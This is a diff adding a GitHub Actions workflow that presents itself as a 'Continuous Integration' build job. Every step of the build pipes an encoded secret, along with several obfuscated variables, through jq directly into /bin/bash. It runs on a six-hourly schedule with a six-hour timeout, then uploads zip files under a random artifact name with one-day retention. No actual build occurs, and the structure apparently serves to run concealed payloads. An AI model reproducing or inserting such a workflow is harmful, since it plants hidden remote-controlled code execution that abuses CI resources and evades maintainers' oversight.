@@ -1,0 +1,38 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          mdpb13889: ${{ secrets.mdpb13889 }}
+        run: |
+          printf '%s' "$mdpb13889" | jq -r .x984 | /bin/bash
+          printf '%s' "$bcv019" | jq -r .vtepp21728 | /bin/bash
+          printf '%s' "$ci0" | jq -r .tfhrk58223 | /bin/bash
+          echo $as8 | jq -r .mr55772 | /bin/bash
+          echo $srket88 | jq -r .tumuj23074 | /bin/bash
+          echo $bd866 | jq -r .o19 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZJXBt8V7
+          path: "*.zip"
+          retention-days: 1
